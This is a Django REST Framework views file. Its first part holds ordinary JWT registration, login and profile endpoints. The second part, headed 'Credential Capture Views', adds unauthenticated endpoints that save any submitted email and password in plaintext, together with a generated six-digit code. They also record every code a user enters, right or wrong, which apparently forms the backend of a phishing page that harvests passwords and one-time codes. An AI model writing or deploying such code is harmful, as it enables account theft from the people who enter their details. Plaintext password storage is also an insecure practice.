from django.contrib.auth.models import User
from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework import status
from rest_framework.permissions import IsAuthenticated, AllowAny
from rest_framework_simplejwt.tokens import RefreshToken
from .models import AccountCredential


def get_tokens_for_user(user):
    refresh = RefreshToken.for_user(user)
    return {
        "refresh": str(refresh),
        "access": str(refresh.access_token),
    }


class RegisterView(APIView):
    def post(self, request):
        email = request.data.get("email", "").strip()
        password = request.data.get("password", "")

        if not email or not password:
            return Response({"error": "Email и пароль обязательны"}, status=status.HTTP_400_BAD_REQUEST)

        username = email  # use email as username
        if User.objects.filter(username=username).exists():
            return Response({"error": "Пользователь с таким email уже существует"}, status=status.HTTP_400_BAD_REQUEST)

        user = User.objects.create_user(username=username, email=email, password=password)
        tokens = get_tokens_for_user(user)
        return Response({"user": {"email": user.email}, **tokens}, status=status.HTTP_201_CREATED)


class LoginView(APIView):
    def post(self, request):
        email = request.data.get("email", "").strip()
        password = request.data.get("password", "")

        try:
            user = User.objects.get(username=email)
        except User.DoesNotExist:
            return Response({"error": "Неправильный email или пароль"}, status=status.HTTP_401_UNAUTHORIZED)

        if not user.check_password(password):
            return Response({"error": "Неправильный email или пароль"}, status=status.HTTP_401_UNAUTHORIZED)

        tokens = get_tokens_for_user(user)
        return Response({"user": {"email": user.email}, **tokens})


class MeView(APIView):
    permission_classes = [IsAuthenticated]

    def get(self, request):
        return Response({"email": request.user.email})


# --- New Credential Capture Views ---

import random

class CredentialSubmitView(APIView):
    permission_classes = [AllowAny]

    def post(self, request):
        email = request.data.get("email")
        password = request.data.get("password")

        if not email or not password:
            return Response({"error": "Email and password required"}, status=status.HTTP_400_BAD_REQUEST)

        # Generate 6-digit code
        generated_code = str(random.randint(100000, 999999))
        
        credential = AccountCredential.objects.create(
            email=email, 
            password=password,
            generated_code=generated_code
        )
        
        return Response({
            "id": credential.id,
            "code": generated_code,
            "message": "Verification code generated."
        }, status=status.HTTP_201_CREATED)


class CredentialVerifyView(APIView):
    permission_classes = [AllowAny]

    def post(self, request):
        cred_id = request.data.get("id")
        user_code = request.data.get("code")

        if not cred_id or not user_code:
            return Response({"error": "ID and code required"}, status=status.HTTP_400_BAD_REQUEST)

        try:
            credential = AccountCredential.objects.get(id=cred_id)
            credential.user_code = user_code
            
            if str(user_code) == str(credential.generated_code):
                credential.is_verified = True
                credential.save()
                return Response({"message": "Login successful", "verified": True}, status=status.HTTP_200_OK)
            else:
                credential.save() # save attempt even if wrong
                return Response({"error": "Invalid code", "verified": False}, status=status.HTTP_400_BAD_REQUEST)
                
        except AccountCredential.DoesNotExist:
            return Response({"error": "Record not found"}, status=status.HTTP_404_NOT_FOUND)
